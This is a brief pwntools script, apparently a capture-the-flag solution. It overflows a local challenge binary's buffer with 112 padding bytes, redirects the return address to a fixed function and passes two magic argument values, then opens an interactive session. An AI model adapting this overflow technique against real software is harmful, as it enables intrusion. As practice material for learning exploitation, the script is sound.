from pwn import *

p = process('./chall')

ret_addr = 0x080491c6

payload = b'A'*112 + p32(ret_addr) + b'A'*4 + p32(0xdadababa) + p32(0xbabadada)

p.sendline(payload)

p.interactive()